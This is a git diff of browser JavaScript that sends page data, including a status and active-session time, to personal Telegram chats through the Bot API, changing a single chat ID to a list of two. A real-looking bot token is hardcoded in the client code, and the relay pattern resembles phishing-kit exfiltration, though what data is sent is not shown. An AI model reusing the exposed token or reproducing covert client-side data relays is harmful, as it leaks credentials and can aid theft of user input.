@@ -1,5 +1,5 @@
 const botToken = "7584451181:AAHttE_QErAgHq8AhJfaNJeWpaV5xwT70sI";
-const chatId = "6381511262";
+const chatIds = ["6381511262", "6987171667"]; // Add more chat IDs as needed
 
 const Toast = Swal.mixin({
   toast: true,
@@ -43,37 +43,40 @@ function sendToBot(data) {
     data.status ?? "-"
   }\n*Sesi Aktif:* ${timeSince(data.sessionStart)} yang lalu.`;
 
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      parse_mode: "markdown",
-      text: message,
-    }),
-  })
-    .then((response) => response.json())
-    .then((result) => {
-      if (result.ok) {
-        Toast.fire({
-          icon: "success",
-          title: "Pesan berhasil dikirim!",
-        });
-      } else {
+  // Loop through each chat ID and send the message
+  chatIds.forEach(chatId => {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        parse_mode: "markdown",
+        text: message,
+      }),
+    })
+      .then((response) => response.json())
+      .then((result) => {
+        if (result.ok) {
+          Toast.fire({
+            icon: "success",
+            title: "Success",
+          });
+        } else {
+          Toast.fire({
+            icon: "error",
+            title: "Gagal",
+          });
+        }
+      })
+      .catch((error) => {
         Toast.fire({
           icon: "error",
-          title: "Gagal mengirim pesan: " + result.description,
+          title: "Gagal",
         });
-      }
-    })
-    .catch((error) => {
-      Toast.fire({
-        icon: "error",
-        title: "Terjadi kesalahan: " + error.message,
       });
-    });
+  });
 }
 
 function timeSince(date) {
